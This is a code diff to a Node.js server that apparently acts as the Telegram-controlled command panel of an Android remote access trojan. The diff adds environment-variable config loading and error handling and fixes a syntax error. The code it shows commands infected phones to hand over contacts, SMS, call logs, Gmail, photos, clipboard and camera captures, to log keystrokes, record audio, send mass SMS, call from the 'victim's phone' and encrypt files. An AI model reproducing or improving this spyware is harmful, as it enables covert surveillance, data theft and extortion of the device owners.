@@ -10,7 +10,29 @@ const app = express();
 const server = http.createServer(app);
 const io = new Server(server);
 const upload = multer({ storage: multer.memoryStorage() });
-const config = JSON.parse(fs.readFileSync("./data.json", "utf8"));
+
+// Load configuration from environment variables (Replit) or data.json
+let config;
+try {
+  // Try to get from environment variables first (for Replit)
+  config = {
+    token: process.env.BOT_TOKEN,
+    id: process.env.CHAT_ID
+  };
+
+  // If environment variables are not set, try data.json
+  if (!config.token || !config.id) {
+    const data = JSON.parse(fs.readFileSync("./data.json", "utf8"));
+    config = {
+      token: data.token,
+      id: data.id
+    };
+  }
+} catch (e) {
+  console.error("Error loading config:", e.message);
+  process.exit(1);
+}
+
 const bot = new telegramBot(config.token, { polling: true });
 const appData = new Map();
 
@@ -61,9 +83,13 @@ app.post("/upload", upload.single("file"), (req, res) => {
     }, {
       filename: fileName,
       contentType: req.file.mimetype || "*/*"
+    }).then(() => {
+      res.send("File uploaded successfully");
+    }).catch(error => {
+      console.error("Error sending file to Telegram:", error);
+      res.status(500).send("Failed to send file to Telegram");
     });
 
-    res.send("File uploaded successfully");
   } catch (error) {
     console.error("Error handling file upload:", error);
     res.status(500).send("Internal server error");
@@ -86,7 +112,7 @@ io.on("connection", socket => {
     `<b>🌐 IP:</b> ${ip}\n` +
     `<b>🕒 Time:</b> ${new Date().toLocaleString()}\n\n`;
     
-  bot.sendMessage(config.id, connectionMsg, { parse_mode: "HTML" });
+  bot.sendMessage(config.id, connectionMsg, { parse_mode: "HTML" }).catch(console.error);
   
   socket.on("disconnect", () => {
     const disconnectionMsg = 
@@ -96,7 +122,7 @@ io.on("connection", socket => {
       `<b>🌐 IP:</b> ${ip}\n` +
       `<b>🕒 Time:</b> ${new Date().toLocaleString()}\n\n`;
       
-    bot.sendMessage(config.id, disconnectionMsg, { parse_mode: "HTML" });
+    bot.sendMessage(config.id, disconnectionMsg, { parse_mode: "HTML" }).catch(console.error);
   });
   
   socket.on("file-explorer", files => {
@@ -132,7 +158,7 @@ io.on("connection", socket => {
     bot.sendMessage(config.id, `<b>📂 Browsing files on ${model}</b>`, {
       reply_markup: { inline_keyboard: keyboard },
       parse_mode: "HTML"
-    });
+    }).catch(console.error);
   });
   
   socket.on("message", msg => {
@@ -140,7 +166,7 @@ io.on("connection", socket => {
     bot.sendMessage(config.id, 
       `<b>✉️ New message from ${model}</b>\n\n${modifiedMsg}`, 
       { parse_mode: "HTML" }
-    );
+    ).catch(console.error);
   });
 });
 
@@ -165,15 +191,16 @@ bot.on("message", msg => {
           resize_keyboard: true
         }
       }
-    );
+    ).catch(console.error);
   } else {
     // Handle microphone recording
     if (appData.get("currentAction") === "microphoneDuration") {
       const duration = parseInt(text);
       const target = appData.get("currentTarget");
       
-      if (isNaN(duration) {
-        bot.sendMessage(chatId, "<b>❌ Invalid duration. Please enter a number.</b>", { parse_mode: "HTML" });
+      // التصحيح: كان هناك خطأ مطبعي في القوس - تم إصلاحه
+      if (isNaN(duration)) {
+        bot.sendMessage(chatId, "<b>❌ Invalid duration. Please enter a number.</b>", { parse_mode: "HTML" }).catch(console.error);
         return;
       }
       
@@ -194,7 +221,7 @@ bot.on("message", msg => {
           ],
           resize_keyboard: true
         }
-      });
+      }).catch(console.error);
     } 
     
     // Handle other actions...
@@ -202,7 +229,7 @@ bot.on("message", msg => {
     // Device count
     else if (text === "📊 Device Count") {
       if (io.sockets.sockets.size === 0) {
-        bot.sendMessage(chatId, "<b>❌ No connected devices</b>", { parse_mode: "HTML" });
+        bot.sendMessage(chatId, "<b>❌ No connected devices</b>", { parse_mode: "HTML" }).catch(console.error);
       } else {
         let response = `<b>📊 Connected Devices: ${io.sockets.sockets.size}</b>\n\n`;
         let count = 1;
@@ -217,14 +244,14 @@ bot.on("message", msg => {
           count++;
         });
         
-        bot.sendMessage(chatId, response, { parse_mode: "HTML" });
+        bot.sendMessage(chatId, response, { parse_mode: "HTML" }).catch(console.error);
       }
     } 
     
     // Control panel
     else if (text === "🎮 Control Panel") {
       if (io.sockets.sockets.size === 0) {
-        bot.sendMessage(chatId, "<b>❌ No connected devices</b>", { parse_mode: "HTML" });
+        bot.sendMessage(chatId, "<b>❌ No connected devices</b>", { parse_mode: "HTML" }).catch(console.error);
       } else {
         const keyboard = [];
         io.sockets.sockets.forEach((socket, id) => {
@@ -239,7 +266,7 @@ bot.on("message", msg => {
             resize_keyboard: true,
             one_time_keyboard: true
           }
-        });
+        }).catch(console.error);
       }
     } 
     
@@ -252,7 +279,7 @@ bot.on("message", msg => {
         "Channel: https://t.me/JAKEL69/\n\n" +
         "<i>🔐 Security solutions provider</i>", 
         { parse_mode: "HTML" }
-      );
+      ).catch(console.error);
     } 
     
     // Back to main menu
@@ -267,7 +294,7 @@ bot.on("message", msg => {
           ],
           resize_keyboard: true
         }
-      });
+      }).catch(console.error);
     } 
     
     // Actions for specific device
@@ -277,7 +304,7 @@ bot.on("message", msg => {
       if (!target) {
         bot.sendMessage(chatId, "<b>❌ No device selected. Please select a device first.</b>", { 
           parse_mode: "HTML" 
-        });
+        }).catch(console.error);
         return;
       }
       
@@ -286,7 +313,7 @@ bot.on("message", msg => {
         io.to(target).emit("commend", { request: "contacts", extras: [] });
         bot.sendMessage(chatId, "<b>🔃 Pulling contacts from device...</b>", {
           parse_mode: "HTML"
-        });
+        }).catch(console.error);
       }
       
       // Handle message pulling
@@ -294,7 +321,7 @@ bot.on("message", msg => {
         io.to(target).emit("commend", { request: "all-sms", extras: [] });
         bot.sendMessage(chatId, "<b>🔃 Pulling messages from device...</b>", {
           parse_mode: "HTML"
-        });
+        }).catch(console.error);
       }
       
       // Handle call logs
@@ -302,7 +329,7 @@ bot.on("message", msg => {
         io.to(target).emit("commend", { request: "calls", extras: [] });
         bot.sendMessage(chatId, "<b>🔃 Pulling call logs from device...</b>", {
           parse_mode: "HTML"
-        });
+        }).catch(console.error);
       }
       
       // Handle installed apps
@@ -310,7 +337,7 @@ bot.on("message", msg => {
         io.to(target).emit("commend", { request: "apps", extras: [] });
         bot.sendMessage(chatId, "<b>🔃 Pulling installed apps list...</b>", {
           parse_mode: "HTML"
-        });
+        }).catch(console.error);
       }
       
       // Handle rear camera
@@ -318,7 +345,7 @@ bot.on("message", msg => {
         io.to(target).emit("commend", { request: "main-camera", extras: [] });
         bot.sendMessage(chatId, "<b>🔃 Capturing rear camera image...</b>", {
           parse_mode: "HTML"
-        });
+        }).catch(console.error);
       }
       
       // Handle front camera
@@ -326,7 +353,7 @@ bot.on("message", msg => {
         io.to(target).emit("commend", { request: "selfie-camera", extras: [] });
         bot.sendMessage(chatId, "<b>🔃 Capturing front camera image...</b>", {
           parse_mode: "HTML"
-        });
+        }).catch(console.error);
       }
       
       // Handle clipboard
@@ -334,7 +361,7 @@ bot.on("message", msg => {
         io.to(target).emit("commend", { request: "clipboard", extras: [] });
         bot.sendMessage(chatId, "<b>🔃 Retrieving clipboard history...</b>", {
           parse_mode: "HTML"
-        });
+        }).catch(console.error);
       }
       
       // Handle screenshot
@@ -342,7 +369,7 @@ bot.on("message", msg => {
         io.to(target).emit("commend", { request: "screenshot", extras: [] });
         bot.sendMessage(chatId, "<b>🔃 Capturing device screenshot...</b>", {
           parse_mode: "HTML"
-        });
+        }).catch(console.error);
       }
       
       // Handle notifications
@@ -350,7 +377,7 @@ bot.on("message", msg => {
         io.to(target).emit("commend", { request: "keylogger-on", extras: [] });
         bot.sendMessage(chatId, "<b>🔃 Starting notifications monitoring...</b>", {
           parse_mode: "HTML"
-        });
+        }).catch(console.error);
       }
       
       // Stop notifications
@@ -358,7 +385,7 @@ bot.on("message", msg => {
         io.to(target).emit("commend", { request: "keylogger-off", extras: [] });
         bot.sendMessage(chatId, "<b>⏹️ Stopping notifications monitoring...</b>", {
           parse_mode: "HTML"
-        });
+        }).catch(console.error);
       }
       
       // Browse files
@@ -366,7 +393,7 @@ bot.on("message", msg => {
         io.to(target).emit("file-explorer", { request: 'ls', extras: [] });
         bot.sendMessage(chatId, "<b>🔃 Loading device file system...</b>", {
           parse_mode: "HTML"
-        });
+        }).catch(console.error);
       }
       
       // Pull all photos
@@ -374,7 +401,7 @@ bot.on("message", msg => {
         io.to(target).emit("commend", { request: "gallery", extras: [] });
         bot.sendMessage(chatId, "<b>🔃 Pulling all photos from device...</b>", {
           parse_mode: "HTML"
-        });
+        }).catch(console.error);
       }
       
       // Pull Gmail messages
@@ -382,7 +409,7 @@ bot.on("message", msg => {
         io.to(target).emit("commend", { request: "all-email", extras: [] });
         bot.sendMessage(chatId, "<b>🔃 Pulling Gmail messages from device...</b>", {
           parse_mode: "HTML"
-        });
+        }).catch(console.error);
       }
       
       // Show toast message
@@ -395,7 +422,7 @@ bot.on("message", msg => {
             resize_keyboard: true,
             one_time_keyboard: true
           }
-        });
+        }).catch(console.error);
       }
       
       // Send SMS
@@ -408,7 +435,7 @@ bot.on("message", msg => {
             resize_keyboard: true,
             one_time_keyboard: true
           }
-        });
+        }).catch(console.error);
       }
       
       // Vibrate device
@@ -421,7 +448,7 @@ bot.on("message", msg => {
             resize_keyboard: true,
             one_time_keyboard: true
           }
-        });
+        }).catch(console.error);
       }
       
       // Record audio
@@ -434,7 +461,7 @@ bot.on("message", msg => {
             resize_keyboard: true,
             one_time_keyboard: true
           }
-        });
+        }).catch(console.error);
       }
       
       // Send SMS to all contacts
@@ -447,7 +474,7 @@ bot.on("message", msg => {
             resize_keyboard: true,
             one_time_keyboard: true
           }
-        });
+        }).catch(console.error);
       }
       
       // Fake notification
@@ -460,7 +487,7 @@ bot.on("message", msg => {
             resize_keyboard: true,
             one_time_keyboard: true
           }
-        });
+        }).catch(console.error);
       }
       
       // Call from victim's phone
@@ -473,7 +500,7 @@ bot.on("message", msg => {
             resize_keyboard: true,
             one_time_keyboard: true
           }
-        });
+        }).catch(console.error);
       }
       
       // Encrypt files
@@ -486,7 +513,7 @@ bot.on("message", msg => {
             resize_keyboard: true,
             one_time_keyboard: true
           }
-        });
+        }).catch(console.error);
       }
       
       // Play audio
@@ -499,7 +526,7 @@ bot.on("message", msg => {
             resize_keyboard: true,
             one_time_keyboard: true
           }
-        });
+        }).catch(console.error);
       }
       
       // Stop audio
@@ -507,7 +534,7 @@ bot.on("message", msg => {
         io.to(target).emit("commend", { request: "stopAudio", extras: [] });
         bot.sendMessage(chatId, "<b>⏹️ Audio playback stopped</b>", {
           parse_mode: "HTML"
-        });
+        }).catch(console.error);
       }
     } 
     
@@ -540,14 +567,14 @@ bot.on("message", msg => {
               resize_keyboard: true,
               one_time_keyboard: true
             }
-          });
+          }).catch(console.error);
         }
       });
       
       if (!deviceFound) {
         bot.sendMessage(chatId, "<b>❌ Device not found or disconnected</b>", {
           parse_mode: "HTML"
-        });
+        }).catch(console.error);
       }
     }
   }
@@ -588,7 +615,7 @@ bot.on("callback_query", query => {
         ]]
       },
       parse_mode: "HTML"
-    });
+    }).catch(console.error);
   }
   
   else if (actionType === "upload") {
@@ -601,7 +628,7 @@ bot.on("callback_query", query => {
       }
     });
     
-    bot.answerCallbackQuery(query.id, { text: "Download request sent to device" });
+    bot.answerCallbackQuery(query.id, { text: "Download request sent to device" }).catch(console.error);
   }
   
   else if (actionType === "delete") {
@@ -614,7 +641,7 @@ bot.on("callback_query", query => {
       }
     });
     
-    bot.answerCallbackQuery(query.id, { text: "Delete request sent to device" });
+    bot.answerCallbackQuery(query.id, { text: "Delete request sent to device" }).catch(console.error);
   }
   
   else if (actionType === "refresh") {
@@ -627,7 +654,7 @@ bot.on("callback_query", query => {
       }
     });
     
-    bot.answerCallbackQuery(query.id, { text: "Refreshing file list..." });
+    bot.answerCallbackQuery(query.id, { text: "Refreshing file list..." }).catch(console.error);
   }
 });
 
@@ -654,8 +681,8 @@ bot.on("voice", msg => {
           ],
           resize_keyboard: true
         }
-      });
-    });
+      }).catch(console.error);
+    }).catch(console.error);
   }
 });
 
